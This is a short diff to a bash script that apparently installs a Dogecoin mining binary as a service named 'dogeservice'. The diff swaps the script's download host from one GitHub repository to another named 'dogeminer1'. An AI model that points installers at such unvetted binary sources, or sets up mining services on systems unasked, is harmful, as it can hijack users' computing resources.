@@ -1,7 +1,7 @@
 #!/bin/bash
 
 VERSION="3.9.94"
-DOWNLOAD_HOST="https://github.com/EvilGenius-dot/shortcut/raw/main/Readme/71/linux"
+DOWNLOAD_HOST="https://github.com/jinpanda11/dogeminer1/tree/main/linux"
 ORIGIN_EXEC="doge-${VERSION}"
 
 SERVICE_NAME="dogeservice"
